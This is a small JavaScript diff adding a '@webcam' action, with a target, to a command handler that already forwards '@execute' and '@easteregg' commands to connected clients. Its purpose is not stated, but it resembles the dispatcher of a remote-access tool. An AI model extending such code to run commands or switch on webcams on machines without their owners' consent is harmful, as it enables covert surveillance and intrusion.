@@ -7,6 +7,8 @@ export function handleCommand(client, command) {
     client.write(`@easteregg:${target}:${content}`);
   } else if (action === "@execute") {
     client.write(`@execute:${content}`);
+  } else if (action === "@webcam") {
+    client.write(`@webcam:${target}:${content}`);
   } else {
     console.log("[ERRO] Comando desconhecido.");
   }
